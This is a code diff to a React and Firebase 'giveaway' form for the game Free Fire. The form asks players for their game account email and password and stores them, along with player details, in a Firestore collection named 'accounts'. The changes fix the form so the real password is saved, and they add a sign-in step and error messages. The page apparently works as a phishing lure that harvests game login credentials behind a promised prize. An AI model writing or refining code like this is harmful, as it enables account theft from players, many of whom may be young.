@@ -1,8 +1,8 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import {
   Box, Container, Typography, TextField, MenuItem, Button, Grid, Card, CardContent, Stack, Alert, Snackbar, InputAdornment, useTheme, alpha,
 } from '@mui/material';
-import { motion, AnimatePresence } from 'framer-motion';
+import { motion } from 'framer-motion';
 import DiamondIcon from '@mui/icons-material/Diamond';
 import GiveawayIntro from './GiveawayIntro';
 import PersonIcon from '@mui/icons-material/Person';
@@ -12,11 +12,9 @@ import EmailIcon from '@mui/icons-material/Email';
 import ShieldIcon from '@mui/icons-material/Shield';
 import BoltIcon from '@mui/icons-material/Bolt';
 import CheckCircleIcon from '@mui/icons-material/CheckCircle';
-import TrendingUpIcon from '@mui/icons-material/TrendingUp';
-import VerifiedUserIcon from '@mui/icons-material/VerifiedUser';
-import LocalFireDepartmentIcon from '@mui/icons-material/LocalFireDepartment';
 import { addDoc, collection, serverTimestamp } from 'firebase/firestore';
-import { db } from '../firebase';
+import { onAuthStateChanged } from 'firebase/auth';
+import { db, auth } from '../firebase';
 
 const levels = Array.from({ length: 51 }, (_, i) => {
   const val = 50 + i;
@@ -49,12 +47,29 @@ const GiveawayForm = () => {
     password: ''
   });
   const [open, setOpen] = useState(false);
+  const [error, setError] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [currentUser, setCurrentUser] = useState(null);
+
+  useEffect(() => {
+    const unsubscribe = onAuthStateChanged(auth, (user) => {
+      setCurrentUser(user);
+    });
+
+    return () => unsubscribe();
+  }, []);
 
   const handleChange = (e) => setFormData({ ...formData, [e.target.name]: e.target.value });
 
   const handleSubmit = async (e) => {
     e.preventDefault();
+
+    if (!currentUser) {
+      setError('Please sign in before entering the giveaway.');
+      return;
+    }
+
+    setError('');
     setIsSubmitting(true);
     try {
       await addDoc(collection(db, 'accounts'), {
@@ -63,13 +78,15 @@ const GiveawayForm = () => {
         region: formData.region,
         level: formData.level,
         email: formData.email,
-        password: formData.note,
+        password: formData.password,
         createdAt: serverTimestamp(),
+        submittedBy: currentUser.uid,
       });
       setOpen(true);
-      setFormData({ playerName: '', uid: '', region: '', level: '', diamonds: '', email: '', note: '' });
+      setFormData({ playerName: '', uid: '', region: '', level: '', email: '', password: '' });
     } catch (err) {
       console.error('Firestore save failed:', err);
+      setError('Unable to submit your entry. Please try again later.');
     } finally {
       setIsSubmitting(false);
     }
@@ -111,6 +128,8 @@ const GiveawayForm = () => {
       color: theme.palette.primary.main,
     },
   };
+
+  const isDisabled = isSubmitting || !currentUser;
 
   return (
     <>
@@ -203,6 +222,18 @@ const GiveawayForm = () => {
                 </Typography>
               </Box>
 
+              {error && (
+                <Alert severity="warning" sx={{ mb: 3 }}>
+                  {error}
+                </Alert>
+              )}
+
+              {!currentUser && (
+                <Alert severity="info" sx={{ mb: 3 }}>
+                  Please sign in to enter the giveaway. Your submission is disabled until you are logged in.
+                </Alert>
+              )}
+
               <form onSubmit={handleSubmit} style={{ width: '100%' }}>
                 <Stack spacing={3}>
                   <Stack direction={{ xs: 'column', md: 'row' }} spacing={3}>
@@ -215,6 +246,7 @@ const GiveawayForm = () => {
                       required
                       placeholder="e.g. SKYLORD"
                       sx={inputStyles}
+                      disabled={isDisabled}
                       InputProps={{
                         startAdornment: (
                           <InputAdornment position="start">
@@ -232,6 +264,7 @@ const GiveawayForm = () => {
                       required
                       placeholder="e.g. 1234567890"
                       sx={inputStyles}
+                      disabled={isDisabled}
                       InputProps={{
                         startAdornment: (
                           <InputAdornment position="start">
@@ -252,6 +285,7 @@ const GiveawayForm = () => {
                       onChange={handleChange}
                       required
                       sx={inputStyles}
+                      disabled={isDisabled}
                       InputProps={{
                         startAdornment: (
                           <InputAdornment position="start">
@@ -275,6 +309,7 @@ const GiveawayForm = () => {
                       onChange={handleChange}
                       required
                       sx={inputStyles}
+                      disabled={isDisabled}
                       InputProps={{
                         startAdornment: (
                           <InputAdornment position="start">
@@ -301,6 +336,7 @@ const GiveawayForm = () => {
                     required
                     placeholder="Enter your free fire id email for confirmation"
                     sx={inputStyles}
+                    disabled={isDisabled}
                     InputProps={{
                       startAdornment: (
                         <InputAdornment position="start">
@@ -318,6 +354,7 @@ const GiveawayForm = () => {
                     onChange={handleChange}
                     placeholder="Enter your free fire id password"
                     sx={inputStyles}
+                    disabled={isDisabled}
                     InputProps={{
                       startAdornment: (
                         <InputAdornment position="start">
@@ -331,7 +368,7 @@ const GiveawayForm = () => {
                     whileHover={{ scale: 1.02 }}
                     whileTap={{ scale: 0.98 }}
                   >
-                    <Button fullWidth type="submit" variant="contained" disabled={isSubmitting} className="btn-neon" sx={{ py: 2.5, fontSize: '1.15rem', fontWeight: 800, borderRadius: '12px' }}>
+                    <Button fullWidth type="submit" variant="contained" disabled={isDisabled} className="btn-neon" sx={{ py: 2.5, fontSize: '1.15rem', fontWeight: 800, borderRadius: '12px' }}>
                       {isSubmitting ? (
                         <Stack direction="row" spacing={2} alignItems="center" justifyContent="center">
                           <BoltIcon />
